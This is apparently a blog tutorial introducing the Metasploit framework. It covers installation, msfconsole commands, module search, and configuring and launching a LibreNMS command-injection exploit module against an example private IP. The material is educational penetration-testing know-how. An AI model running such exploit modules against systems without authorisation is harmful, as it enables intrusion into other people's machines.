---
title: "Intro To Metasploit"
categories:
  - Hacking
---

The basics of finding And exploiting vulnerabilities using Metasploit.

Metasploit is a penetration testing framework that helps you find and exploit vulnerabilities.

The Metasploit Framework is one of the most useful testing tools available to security professionals. Using Metasploit, you can access disclosed exploits for a wide variety of applications and operating systems. You can automatically scan, test, and exploit systems using code that other hackers have written.

Metasploit also provides a development platform for you to write your own security tools or exploit code.

Today, I am going to guide you through the basics of how to use Metasploit: how to install Metasploit, use the framework, and exploit a vulnerability.

## Installing Metasploit

If you are using Kali Linux, Metasploit is already installed for you. All you have to do now is to get started hacking!

Otherwise, you can download the installer for your platform here.

[rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)

## Let's Get Started

After you've installed Metasploit, the first thing that you will want to do is to launch the platform. You can launch Metasploit by running this command in your terminal:

```bash
$ msfconsole
```

You will see your terminal prompt changed to `msf >`.

```bash
msf >
```

First, you can run `help` to see the help menu. This will show you the list of commands available.

```bash
msf > help
```

![](https://vickieli.dev/assets/images/hacking-06.png)

You can also run `search` to look for modules if you already have an idea of what you want to do. For example, this command will search for exploits and scripts related to MySQL.

```bash
msf > search mysql
```

![](https://vickieli.dev/assets/images/hacking-07.png)

You can also run `help search` to display the filters that can be used with `search`. For example, you can search by the CVE year, platform name, or module type.

```bash
search cve:2009 type:exploit platform:-linux
```

The `info` command displays additional information about a module. The command will show you information about a particular module, including its author, description, intended targets, options for exploitation, and reference links.

```bash
msf > info exploit/linux/http/librenms_collectd_cmd_inject
```

![](https://vickieli.dev/assets/images/hacking-08.png)

After you have decided on a module to use, run `use`to select it.

```bash
msf > use exploit/linux/http/librenms_collectd_cmd_inject
```

This will change the context of your commands and allow you to run commands specific to this module.

```bash
msf exploit(linux/http/librenms_collectd_cmd_inject) >
```

## Exploiting Vulnerabilities With Metasploit

Now that you are inside the module, run `options` to see what you can do.

```bash
msf exploit(linux/http/librenms_collectd_cmd_inject) > options
```

![](https://vickieli.dev/assets/images/hacking-09.png)

The command will display the variables that you can customize and the payloads options that you can choose.

You can configure framework options and parameters for the module using `set`. For example, to set the target host for exploitation, you can run:

```bash
msf exploit(linux/http/librenms_collectd_cmd_inject) > set RHOSTS 172.16.194.134
```

You will need to set all the required variables before you can run the exploit. For this particular module, you have to provide the `PASSWORD`, `RHOSTS`, `RPORT`, `TARGETURI`, and `USERNAME`.

In Metasploit, `LHOST`, `RHOST` and `SRVHOST` are some of the most commonly used variable names. `LHOST` refers to the IP of your machine, which is usually used to create a reverse connection to your machine after the attack succeeds. `RHOST` refers to the IP address of the target host. And `SRVHOST` is where the module will connect to download additional payload elements.

Finally, after you are done configuring, you can run the command `exploit` to start the exploit!

```bash
msf exploit(linux/http/librenms_collectd_cmd_inject) > exploit
```

## Conclusion
==========

Today, we covered the very basics of using Metasploit. Metasploit is a feature-rich framework and has a lot more to explore. But by learning how to configure and run an exploit, you now have the basic skills to start utilizing this powerful tool!